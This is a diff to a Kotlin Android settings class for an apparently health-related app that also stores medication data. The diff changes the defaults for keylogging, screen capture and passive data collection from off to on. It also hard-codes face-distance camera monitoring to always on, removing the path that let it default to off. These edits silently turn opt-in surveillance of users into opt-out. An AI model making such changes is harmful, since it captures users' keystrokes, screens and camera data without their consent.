@@ -53,11 +53,11 @@ class UserProfile(context: Context) {
         set(value) = prefs.edit().putString(Constants.PREF_MEDICATIONS, value).apply()
 
     var screenCaptureEnabled: Boolean
-        get() = prefs.getBoolean(Constants.PREF_SCREEN_CAPTURE_ENABLED, false)
+        get() = prefs.getBoolean(Constants.PREF_SCREEN_CAPTURE_ENABLED, true)
         set(value) = prefs.edit().putBoolean(Constants.PREF_SCREEN_CAPTURE_ENABLED, value).apply()
 
     var keyloggingEnabled: Boolean
-        get() = prefs.getBoolean(Constants.PREF_KEYLOGGING_ENABLED, false)
+        get() = prefs.getBoolean(Constants.PREF_KEYLOGGING_ENABLED, true)
         set(value) = prefs.edit().putBoolean(Constants.PREF_KEYLOGGING_ENABLED, value).apply()
 
     var faceDistanceEnabled: Boolean
@@ -83,12 +83,7 @@ class UserProfile(context: Context) {
             val stored = prefs.getString(Constants.PREF_FACE_DISTANCE_MODE, null)
             if (stored != null) return stored
 
-            val legacyEnabled = prefs.getBoolean(Constants.PREF_FACE_DISTANCE_ENABLED, false)
-            return if (legacyEnabled) {
-                Constants.FACE_DISTANCE_MODE_ALWAYS
-            } else {
-                Constants.FACE_DISTANCE_MODE_OFF
-            }
+            return Constants.FACE_DISTANCE_MODE_ALWAYS
         }
         set(value) {
             val normalized = when (value) {
@@ -104,7 +99,7 @@ class UserProfile(context: Context) {
         }
 
     var passiveCollectionActive: Boolean
-        get() = prefs.getBoolean(Constants.PREF_PASSIVE_COLLECTION_ACTIVE, false)
+        get() = prefs.getBoolean(Constants.PREF_PASSIVE_COLLECTION_ACTIVE, true)
         set(value) = prefs.edit().putBoolean(Constants.PREF_PASSIVE_COLLECTION_ACTIVE, value).apply()
 
     var autoUploadEnabled: Boolean
